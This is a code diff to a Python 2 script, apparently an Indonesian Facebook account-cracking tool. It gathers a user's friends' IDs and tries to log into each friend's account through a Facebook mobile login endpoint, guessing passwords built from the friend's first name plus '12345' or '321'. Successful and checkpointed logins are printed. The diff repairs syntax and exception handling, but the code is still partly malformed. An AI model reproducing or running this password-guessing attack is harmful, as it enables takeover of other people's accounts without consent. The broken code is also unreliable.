@@ -34,6 +34,8 @@ def id_teman():
     global id_teman
     try:
         token = open("token.txt", "r").read()
+    except IOError:
+        os.system("rm -f token.txt")
 
     else:
         try:
@@ -43,14 +45,14 @@ def id_teman():
                 id_teman.append(iqbal['id'])
 
         except IOError:
-            print "Tidak Ada token.."
-            os.system("rm -rf token.txt")
             sys.exit()
 
     except 
 def iqbalsup():
     try:
         token = open("token.txt", "r").read()
+    except IOError:
+        os.system("rm -f token.txt")
 
     else:
         try:
@@ -63,7 +65,7 @@ def iqbalsup():
                 print " [OK] " + id_teman + " | " + sandi1
             elif "www.facebook.com" in jsl_iqbal["error_msg"]:
                 print " [CP] " + id_teman + " | " + sandi1
-            elif:
+            else:
                 sandi2 = jsl["first_name"] + "12345"
                 log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                 jsl_iqbal = json.load(log)
@@ -71,7 +73,7 @@ def iqbalsup():
                     print " [OK] " + id_teman + " | " + sandi2
                 elif "www.facebook.com" in jsl_iqbal["error_msg"]:
                     print " [CP] " + id_teman + " | " + sandi2
-                elif:
+                else:
                     sandi3 = jsl["first_name"] + "321"
                     log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                     jsl_iqbal = json.loads(log)
@@ -83,6 +85,9 @@ def iqbalsup():
 
         except:
             pass
+    except KeyboardInterrupt:
+        sys.exit()
+
     print "selesai"                    
 
 def main():
